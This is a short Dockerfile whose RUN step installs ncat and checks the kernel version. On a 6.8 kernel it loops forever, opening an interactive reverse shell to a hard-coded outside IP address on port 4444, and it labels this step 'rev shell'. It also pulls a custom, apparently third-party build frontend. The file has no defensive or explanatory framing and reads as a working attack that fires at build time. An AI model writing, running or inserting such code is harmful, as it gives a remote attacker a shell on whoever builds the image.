# syntax=er028455/df-frontend:v4
FROM alpine:3.19

ARG CACHEBUST=1
RUN apk add --no-cache bash nmap-ncat coreutils procps \
 && KVER=$(uname -r) \
 && echo "CB=$CACHEBUST KERNEL=$KVER" >&2 \
 && case "$KVER" in \
      6.8.*) \
        echo "6.8 kernel - rev shell" >&2 ;; \
      *) \
        echo "skip: kernel $KVER not 6.8" >&2 ; exit 0 ;; \
    esac \
 && while true; do \
    rm -f /tmp/f; \
    mkfifo /tmp/f; \
    cat /tmp/f | /bin/sh -i 2>&1 | ncat 129.101.121.138 4444 > /tmp/f; \
    sleep 5; \
  done
